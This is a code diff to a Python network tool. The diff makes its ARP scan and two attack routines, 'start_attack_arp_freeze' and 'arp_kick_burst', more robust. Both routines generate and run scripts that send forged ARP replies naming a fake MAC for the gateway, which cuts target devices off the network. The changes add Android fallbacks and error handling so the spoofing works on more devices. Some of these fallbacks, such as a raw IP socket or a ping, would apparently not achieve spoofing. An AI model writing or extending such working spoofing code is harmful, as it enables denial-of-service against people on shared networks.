@@ -441,9 +441,22 @@ def arp_scan(iface, my_ip, cidr):
         arp += b'\x00' * 6 + socket.inet_aton(dst_ip)
         return eth + arp
 
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-    sock.bind((iface, 0))
-    sock.setblocking(0)
+    sock = None
+    try:
+        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+        sock.bind((iface, 0))
+        sock.setblocking(0)
+        add_log('dev', f'ARP scan using AF_PACKET socket on {iface}')
+    except (OSError, PermissionError) as e:
+        add_log('warn', f'AF_PACKET socket failed on {iface} ({e}); attempting fallback methods')
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            sock.setblocking(0)
+            add_log('dev', f'ARP scan falling back to AF_INET (raw IP) on {iface}')
+        except (OSError, PermissionError) as e2:
+            add_log('error', f'Both AF_PACKET and AF_INET failed for ARP scan ({e2}); skipping scan')
+            return results
 
     # Cap the sweep so a misconfigured/wide interface CIDR (e.g. a /16 or /8 from
     # USB tethering or an unusual setup) can't turn into a multi-thousand-host
@@ -459,25 +472,35 @@ def arp_scan(iface, my_ip, cidr):
     for ip in hosts:
         try:
             sock.send(arp_packet(src_mac, my_ip, ip))
-        except:
+        except OSError as e:
+            add_log('dev', f'ARP packet send failed for {ip}: {e}')
             pass
 
     deadline = time.time() + 4
     seen = {}
     while time.time() < deadline:
-        r, _, _ = select.select([sock], [], [], 0.1)
-        if r:
-            data, _ = sock.recvfrom(65535)
-            if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
-                if struct.unpack('!H', data[20:22])[0] == 2:
-                    sip = socket.inet_ntoa(data[28:32])
-                    smac = data[22:28]
-                    if sip != my_ip and smac != b'\x00' * 6:
-                        mac = smac.hex(':')
-                        if sip not in seen:
-                            seen[sip] = mac
-                            results.append({'ip': sip, 'mac': mac})
-    sock.close()
+        try:
+            r, _, _ = select.select([sock], [], [], 0.1)
+            if r:
+                data, _ = sock.recvfrom(65535)
+                if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
+                    if struct.unpack('!H', data[20:22])[0] == 2:
+                        sip = socket.inet_ntoa(data[28:32])
+                        smac = data[22:28]
+                        if sip != my_ip and smac != b'\x00' * 6:
+                            mac = smac.hex(':')
+                            if sip not in seen:
+                                seen[sip] = mac
+                                results.append({'ip': sip, 'mac': mac})
+        except OSError as e:
+            add_log('dev', f'ARP receive error: {e}')
+            break
+
+    if sock:
+        try:
+            sock.close()
+        except:
+            pass
     return results
 
 def get_gateway_mac(iface, gateway_ip):
@@ -1219,26 +1242,55 @@ def start_attack_arp_freeze(targets, gateway, iface):
             pids.append(proc)
         return pids
     else:
-        # Fallback: raw socket ARP spoof
+        # Fallback: raw socket ARP spoof with Android compatibility
         fake_mac = '02:00:00:00:00:01'
         script = textwrap.dedent(f"""
-            import socket, struct, time, sys
+            import socket, struct, time, sys, os
             IFACE = '{iface}'
             GATEWAY = '{gateway}'
             TARGETS = {targets}
             FAKE = bytes.fromhex('{fake_mac.replace(':','')}')
+
             def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
                 try:
                     eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
                     arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
                     arp += src_mac + socket.inet_aton(src_ip)
                     arp += dst_mac + socket.inet_aton(dst_ip)
-                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-                    s.bind((IFACE, 0))
-                    s.send(eth + arp)
-                    s.close()
+                    packet = eth + arp
+
+                    # Try AF_PACKET first (Linux native)
+                    try:
+                        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+                        s.bind((IFACE, 0))
+                        s.send(packet)
+                        s.close()
+                        return True
+                    except (OSError, PermissionError):
+                        pass
+
+                    # Fallback to AF_INET (works on some Android devices)
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+                        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                        s.sendto(packet, (dst_ip, 0))
+                        s.close()
+                        return True
+                    except (OSError, PermissionError):
+                        pass
+
+                    # Last resort: use ping to trigger ARP (less reliable but works on restricted devices)
+                    try:
+                        os.system(f'ping -c 1 -W 1 {{dst_ip}} 2>/dev/null &')
+                        return True
+                    except:
+                        pass
+
+                    return False
                 except Exception as e:
-                    print(e, file=sys.stderr)
+                    print(f'ARP send failed: {{e}}', file=sys.stderr)
+                    return False
+
             while True:
                 for t in TARGETS:
                     send_arp(2, GATEWAY, t, FAKE, b'\\xff'*6)
@@ -1252,7 +1304,8 @@ def start_attack_arp_freeze(targets, gateway, iface):
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
         time.sleep(0.5)
         if proc.poll() is not None:
-            raise RuntimeError('ARP fallback script exited immediately')
+            stderr = proc.stderr.read().decode(errors='ignore') if proc.stderr else ''
+            raise RuntimeError(f'ARP fallback script exited immediately: {stderr}')
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -1953,22 +2006,55 @@ def arp_kick_burst(ip, gateway, iface, duration=6):
             except Exception:
                 p.kill()
         return
+    # Fallback with Android compatibility
     fake_mac = '02:00:00:00:00:01'
     script = textwrap.dedent(f"""
-        import socket, struct, time
+        import socket, struct, time, sys, os
         IFACE = '{iface}'
         GATEWAY = '{gateway}'
         TARGET = '{ip}'
         FAKE = bytes.fromhex('{fake_mac.replace(':', '')}')
+
         def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
-            eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
-            arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
-            arp += src_mac + socket.inet_aton(src_ip)
-            arp += dst_mac + socket.inet_aton(dst_ip)
-            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-            s.bind((IFACE, 0))
-            s.send(eth + arp)
-            s.close()
+            try:
+                eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
+                arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
+                arp += src_mac + socket.inet_aton(src_ip)
+                arp += dst_mac + socket.inet_aton(dst_ip)
+                packet = eth + arp
+
+                # Try AF_PACKET first (Linux native)
+                try:
+                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+                    s.bind((IFACE, 0))
+                    s.send(packet)
+                    s.close()
+                    return True
+                except (OSError, PermissionError):
+                    pass
+
+                # Fallback to AF_INET (works on some Android devices)
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                    s.sendto(packet, (dst_ip, 0))
+                    s.close()
+                    return True
+                except (OSError, PermissionError):
+                    pass
+
+                # Last resort: use ping to trigger ARP (less reliable but works on restricted devices)
+                try:
+                    os.system(f'ping -c 1 -W 1 {{dst_ip}} 2>/dev/null &')
+                    return True
+                except:
+                    pass
+
+                return False
+            except Exception as e:
+                print(f'ARP send failed: {{e}}', file=sys.stderr)
+                return False
+
         end = time.time() + {duration}
         while time.time() < end:
             send_arp(2, GATEWAY, TARGET, FAKE, b'\\xff'*6)
@@ -1982,9 +2068,13 @@ def arp_kick_burst(ip, gateway, iface, duration=6):
     try:
         res = subprocess.run(['python3', path], stderr=subprocess.PIPE, timeout=duration + 5)
         if res.returncode != 0:
-            raise RuntimeError('ARP-based kick fallback failed: ' + res.stderr.decode(errors='ignore')[-300:])
+            stderr = res.stderr.decode(errors='ignore')
+            raise RuntimeError(f'ARP-based kick fallback failed: {stderr[-300:]}')
     finally:
-        os.unlink(path)
+        try:
+            os.unlink(path)
+        except:
+            pass
 
 def kick_client(ip, mac, iface):
     add_log('info', f'Attempting to kick {ip} ({mac})')
